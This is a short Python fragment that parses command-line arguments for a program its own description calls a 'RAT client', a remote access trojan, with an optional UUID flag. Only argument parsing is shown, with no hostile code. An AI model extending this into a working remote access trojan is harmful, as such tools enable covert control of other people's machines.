import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description="RAT client")
    parser.add_argument("--uuid", type=str, help="Optional UUID for this RAT client")
    return parser.parse_args()
